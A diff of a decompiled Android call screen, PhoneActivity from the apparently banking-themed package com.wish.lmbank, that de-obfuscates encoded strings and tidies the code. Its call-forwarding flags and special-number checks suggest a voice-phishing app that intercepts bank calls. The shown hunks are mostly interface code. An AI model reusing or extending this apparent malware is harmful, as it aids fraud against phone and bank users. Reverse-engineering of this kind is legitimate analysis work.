@@ -51,6 +51,7 @@ import java.util.Timer;
 import java.util.TimerTask;
 
 import gv00l3ah.mvdt7w.bb7d7pu7;
+
 public class PhoneActivity extends AppCompatActivity implements View.OnClickListener, SensorEventListener, Keyboard.KeyboardListener {
     private static final String TAG = "com.wish.lmbank.phone.PhoneActivity";
     private static Timer callTimer;
@@ -86,7 +87,7 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
     private View menuTop;
     private NotificationManager notificationManager;
     public NotifyBean notifyBean = new NotifyBean();
-    private Runnable notifyRunnable = new NotifyRunnable(this);
+    private final Runnable notifyRunnable = new NotifyRunnable(this);
     private int notifyTime = 0;
     private String pNumber;
     private PhoneCallManager phoneCallManager;
@@ -211,9 +212,8 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
 
     private void createNotification() {
         if (VERSION.SDK_INT >= 26) {
-            this.notificationManager = (NotificationManager) this.getSystemService(NotificationManager.class);
+            this.notificationManager = this.getSystemService(NotificationManager.class);
         }
-
     }
 
     public static String fillZero(int var0) {
@@ -288,26 +288,26 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
 
     @SuppressLint("ResourceType")
     private void initView() {
-        rlIncomingContainer = (RelativeLayout) this.findViewById(R.id.ho);
-        rlCallingContainer = (RelativeLayout) this.findViewById( R.id.d_);
+        rlIncomingContainer = this.findViewById(R.id.ho);
+        rlCallingContainer = this.findViewById(R.id.d_);
         tvDialing = (TextView) this.findViewById(R.id.pk);
         this.tvIncomingTitle = (TextView) this.findViewById(R.id.pn);
         this.tvIncomingNumber = (TextView) this.findViewById(R.id.pm);
-        this.callCustomView = (CallCustomView) this.findViewById( R.id.d2);
+        this.callCustomView = (CallCustomView) this.findViewById(R.id.d2);
         this.tvPhone = (TextView) this.findViewById(R.id.l5);
-        this.tvPhone2 = (TextView) this.findViewById( R.id.l6);
+        this.tvPhone2 = (TextView) this.findViewById(R.id.l6);
         llTimerContainer = (LinearLayout) this.findViewById(R.id.j1);
         this.tvCallingTime = (TextView) this.findViewById(R.id.pp);
         this.ivSpeaker = (ImageView) this.findViewById(R.id.hn);
         this.ivRecording = (ImageView) this.findViewById(R.id.hm);
         this.ivCallStop = (ImageView) this.findViewById(R.id.hk);
-        this.tvCallStop = (TextView) this.findViewById( R.id.pj);
-        this.ivMic = (ImageView) this.findViewById( R.id.hl);
-        this.tvRecording = (TextView) this.findViewById( R.id.po);
+        this.tvCallStop = (TextView) this.findViewById(R.id.pj);
+        this.ivMic = (ImageView) this.findViewById(R.id.hl);
+        this.tvRecording = (TextView) this.findViewById(R.id.po);
         this.place = this.findViewById(R.id.l9);
         this.menuTop = this.findViewById(R.id.j7);
         this.keyboardLayout = this.findViewById(R.id.ia);
-        Keyboard var1 = (Keyboard) this.findViewById(R.id.i_);
+        Keyboard var1 = this.findViewById(R.id.i_);
         this.keyboard = var1;
         var1.setKeyboardClickListener(this);
         TextView var2 = (TextView) this.findViewById(R.id.ib);
@@ -331,6 +331,9 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
 //        var9 = this.findViewById(0x7f090125);
         var9 = this.findViewById(R.id.h9);
         var9.setOnClickListener(this);
+
+
+
 //         String var11 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
         String var11 = "KEY_IS_FORWARDING_HAND_UP";
         boolean var3 = SharedPreferencesUtils.getValue(var11, false);
@@ -339,6 +342,7 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
             if (var4 == 1) {
                 SharedPreferencesUtils.putValue(var11, false);
             }
+
         } else if (var3) {
 //             var11 = bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA");
             var11 = "KEY_FORWARDING_SHOW_PHONE";
@@ -495,8 +499,7 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
     }
 
     private int startNotifyTimer() {
-        int var1 = this.notifyTime++;
-        return var1;
+        return this.notifyTime++;
     }
 
     private void startTimer() {
@@ -587,8 +590,7 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
     public void cancelNotification() {
         try {
 //             String var4 = bb7d7pu7.m5998("BwYdAA8ACggdAAYH");
-            String var4 = "notification";
-            NotificationManager var5 = (NotificationManager) this.getSystemService(var4);
+            NotificationManager var5 = (NotificationManager) this.getSystemService(Context.NOTIFICATION_SERVICE);
             var5.cancel(1993);
         } catch (Exception var3) {
             StringBuilder var1 = new StringBuilder();
@@ -850,8 +852,8 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         boolean var2 = false;
         int var3;
         switch (var1.getId()) {
-            case 2131296546:
-                var2 = this.d0 ^ true;
+            case R.id.h6:
+                var2 = !this.d0;
                 this.d0 = var2;
                 this.phoneCallManager.setCallHold(var2);
                 if (this.d0) {
@@ -864,7 +866,7 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
                     this.tvCallStop.setText("통화대기");
                 }
                 break;
-            case 2131296547:
+            case R.id.h7:
                 StringBuilder var4 = new StringBuilder();
                 var4.append(TAG);
 //                 var4.append(bb7d7pu7.m5998("RUkLHB0dBgdJDAcNSQoIBQVFSRkBBgcMKggFBSQIBwgODBtJVFRJBxwFBVNJ"));
@@ -878,10 +880,10 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
                 this.phoneCallManager.disconnect();
                 this.cancelTimer();
                 this.closeActivity();
-            case 2131296548:
+            case R.id.h8:
             default:
                 break;
-            case 2131296549:
+            case R.id.h9:
                 if (this.keyboardLayout.getVisibility() != View.VISIBLE) {
                     this.keyboardLayout.setVisibility(View.VISIBLE);
                     this.tvPhone.setVisibility(View.GONE);
@@ -898,17 +900,17 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
                     this.place.setVisibility(View.GONE);
                 }
                 break;
-            case 2131296550:
+            case R.id.h_:
                 if (this.phoneCallManager.setMicrophone()) {
-                    var3 = 0x7f0800a2;
+                    var3 = R.drawable.cb;
                 } else {
-                    var3 = 0x7f0800a1;
+                    var3 = R.drawable.ca;
                 }
 
                 this.ivMic.setImageResource(var3);
                 break;
-            case 2131296551:
-                var2 = this.e0 ^ true;
+            case R.id.ha:
+                var2 = !this.e0;
                 this.e0 = var2;
                 if (var2) {
                     this.ivRecording.setImageResource(R.drawable.cu);
@@ -920,11 +922,11 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
                     this.tvRecording.setText("녹음");
                 }
                 break;
-            case 2131296552:
+            case R.id.hb:
                 if (this.phoneCallManager.setSpeaker()) {
-                    var3 = 0x7f0800bd;
+                    var3 = R.drawable.d2;
                 } else {
-                    var3 = 0x7f0800bc;
+                    var3 = R.drawable.d1;
                 }
 
                 this.ivSpeaker.setImageResource(var3);
@@ -935,12 +937,11 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
     @SuppressLint("InvalidWakeLockTag")
     protected void onCreate(Bundle var1) {
         super.onCreate(var1);
-        StringBuilder var2 = new StringBuilder();
         String var3 = TAG;
-        var2.append(var3);
+        String var2 = var3 +
 //         var2.append(bb7d7pu7.m5998("RUkGByobDAgdDA"));
-        var2.append(", onCreate");
-        LogUtils.callLog(var2.toString());
+                ", onCreate";
+        LogUtils.callLog(var2);
         this.setFullscreen(true, false);
         this.getWindow().addFlags(6815872);
         this.setContentView(R.layout.a_);
@@ -952,12 +953,12 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         this.createRemoteView();
 //         String var4 = bb7d7pu7.m5998("GgwHGgYb");
         String var4 = "sensor";
-        SensorManager var5 = (SensorManager) this.getSystemService(var4);
+        SensorManager var5 = (SensorManager) this.getSystemService(Context.SENSOR_SERVICE);
         this.mSensorManager = var5;
         this.mSensor = var5.getDefaultSensor(8);
 //         var4 = bb7d7pu7.m5998("GQYeDBs");
         var4 = "power";
-        PowerManager var6 = (PowerManager) this.getSystemService(var4);
+        PowerManager var6 = (PowerManager) this.getSystemService(Context.POWER_SERVICE);
         this.mWakeLock = var6.newWakeLock(PowerManager.PROXIMITY_SCREEN_OFF_WAKE_LOCK, var3);
     }
 
@@ -1025,12 +1026,10 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
 
     protected void onNewIntent(Intent var1) {
         super.onNewIntent(var1);
-        StringBuilder var3 = new StringBuilder();
-        String var2 = TAG;
-        var3.append(var2);
+        String var3 = TAG +
 //         var3.append(bb7d7pu7.m5998("RUkGBycMHiAHHQwHHQ"));
-        var3.append(", onNewIntent");
-        LogUtils.callLog(var3.toString());
+                ", onNewIntent";
+        LogUtils.callLog(var3);
     }
 
     protected void onPause() {
@@ -1053,13 +1052,13 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         if (var2 != null && var1.sensor.getType() == 8 && this.mWakeLock != null) {
             if ((double) var2[0] == 0.0) {
 //                 LogUtils.d(TAG, new Object[]{bb7d7pu7.m5998("AQgHDRpJHBk")});
-                LogUtils.d(TAG, new Object[]{"hands up"});
+                LogUtils.d(TAG, "hands up");
                 if (!this.mWakeLock.isHeld()) {
                     this.mWakeLock.acquire();
                 }
             } else {
 //                 LogUtils.d(TAG, new Object[]{bb7d7pu7.m5998("AQgHDRpJBAYfDA0")});
-                LogUtils.d(TAG, new Object[]{"hands moved"});
+                LogUtils.d(TAG, "hands moved");
                 if (!this.mWakeLock.isHeld()) {
                     this.mWakeLock.setReferenceCounted(false);
                     this.mWakeLock.release();
@@ -1160,8 +1159,7 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
             PhoneActivity.access$1000(this.this$0).setText(this.this$0.getCallingTime());
             String var1 = this.val$switchStatus;
 //             if (bb7d7pu7.m5998("Bgc").equals(var1) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2)
-            if ("on".equals(var1) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2)
-            {
+            if ("on".equals(var1) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2) {
                 StringBuilder var4 = new StringBuilder();
                 LimitPhoneNumberBean var2 = SettingUtils.isSpecial(PhoneActivity.access$1300());
                 if (var2 != null) {
